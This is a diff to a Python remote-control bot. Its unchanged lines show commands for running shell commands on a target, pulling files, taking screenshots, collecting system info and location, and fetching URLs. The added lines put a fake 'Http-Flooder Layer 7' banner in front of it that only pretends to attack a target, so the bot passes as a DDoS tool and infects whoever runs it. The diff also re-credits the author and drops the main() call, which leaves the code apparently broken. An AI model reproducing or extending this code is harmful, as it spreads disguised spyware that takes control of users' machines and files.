@@ -3,6 +3,39 @@ import platform
 import requests
 import subprocess
 import time
+
+def banner():
+    print()
+    print("""  \t \t\033[93m───▄▀▀▀▀▀───▄█▀▀▀█▄
+\t──▐▄▄▄▄▄▄▄▄██▌▀▄▀▐██
+\033[91m\t──▐▒▒▒▒▒▒▒▒███▌▀▐██\033[93m█\t [\033[36m*\033[93m]  \033[36mHttp-Flooder Layer 7
+\033[92m\t───▌▒▓▒▒▒▒▓▒██▌▀▐██
+\033[95m\t───▌▓▐▀▀▀▀▌▓─▀▀▀▀▀ 
+
+\t\033[36m[-] Dev :\033[36m Yesha Ex Dev""") 
+
+banner()
+print()
+print()
+t = str(input("""\033[92m╔═══\033[91m[\033[36mTARGET\033[91m]\n\033[92m╚══> \033[0m"""))
+time.sleep(2)
+print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
+time.sleep(1)
+print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
+print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
+time.sleep(1)
+print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
+print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
+time.sleep(1)
+print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
+print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
+time.sleep(1)
+print("\033[36m[\033[91m * \033[36m] DOWN SERVER \033[91m", t)    
+time.sleep(1)
+print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
+time.sleep(1)
+print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
+
 try:
     from PIL import ImageGrab
 except ImportError:
@@ -61,6 +94,8 @@ def execute_command(command):
             return 'Some shit occured'
     elif command == 'info':
         system_info = {
+        "——{ TERMINAL INFORMATION } ——"
+        
             'Platform': platform.platform(),
             'System': platform.system(),
             'Node Name': platform.node(),
@@ -86,15 +121,26 @@ def execute_command(command):
             return f"Error taking screenshot: {e}"
     elif command == 'help':
         return '''
-        HELP MENU: Coded By Yesha | 4ZU PH
-CMD Commands        | Execute cmd commands directly in bot
-cd ..               | Change the current directory
-cd foldername       | Change to current folder
-download filename   | Download File From Target
-screenshot          | Capture Screenshot
-info                | Get System Info
-location            | Get Target Location
-get url             | Download File From URL (provide direct link)
+                —— {COMMANDS } ——
+                
+-------------------------                
+cd 
+-------------------------
+cd foldername 
+-------------------------
+download filename 
+-------------------------
+screenshot  
+-------------------------      
+info        
+-------------------------
+location          
+-------------------------
+get url   
+-------------------------
+
+
+CODED BY : 4ZU PH | Y3SH4
             '''
     elif command.startswith('download '):
         filename = command[
@@ -179,6 +225,9 @@ def main():
         else:
             print("No updates found.")
         time.sleep(1)
-if __name__ == '__main__':
-    main()
-#coded by machine1337. Don't copy this code
+
+#coded by y3sh4 dont copy
+
+    
+    
+    
